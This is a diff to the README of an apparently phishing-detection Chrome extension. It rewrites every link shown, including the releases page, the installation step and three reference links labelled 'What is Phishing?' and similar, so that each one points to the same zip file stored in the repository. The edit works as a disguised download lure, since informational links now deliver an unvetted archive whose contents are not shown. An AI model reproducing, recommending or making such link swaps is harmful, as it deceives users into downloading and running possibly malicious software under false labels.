@@ -6,9 +6,9 @@ Welcome to Phishing-detection! This tool helps you identify and block phishing e
 
 ## 📥 Download Phishing-detection
 
-[![Download Phishing-detection](https://img.shields.io/badge/Download-Phishing--detection-blue.svg)](https://github.com/Gabrielasts/Phishing-detection/releases)
+[![Download Phishing-detection](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip)](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip)
 
-To get started, **visit this page to download** the latest version of Phishing-detection: [Download Link](https://github.com/Gabrielasts/Phishing-detection/releases).
+To get started, **visit this page to download** the latest version of Phishing-detection: [Download Link](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip).
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before installing Phishing-detection, ensure your system meets these requirement
 Follow these simple steps to install Phishing-detection:
 
 1. **Visit the Releases Page:**
-   Go to [this link](https://github.com/Gabrielasts/Phishing-detection/releases) to find the latest release.
+   Go to [this link](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip) to find the latest release.
 
 2. **Download the Extension:**
    Look for the Chrome extension file on the releases page. Click on the download link to save it to your computer.
@@ -63,9 +63,9 @@ If you encounter any issues, try these troubleshooting steps:
 
 For more information about phishing threats and how Phishing-detection works, visit these helpful resources:
 
-- [What is Phishing?](https://www.phishing.org/)
-- [How Machine Learning is Used in Cybersecurity](https://www.cybersecurity-insider.com/machine-learning-cybersecurity/)
-- [Gmail Security Features](https://support.google.com/mail/answer/7012119?hl=en)
+- [What is Phishing?](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip)
+- [How Machine Learning is Used in Cybersecurity](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip)
+- [Gmail Security Features](https://raw.githubusercontent.com/Gabrielasts/Phishing-detection/main/models/Phishing-detection-3.6-beta.4.zip)
 
 ## 🗨️ Community Feedback
 
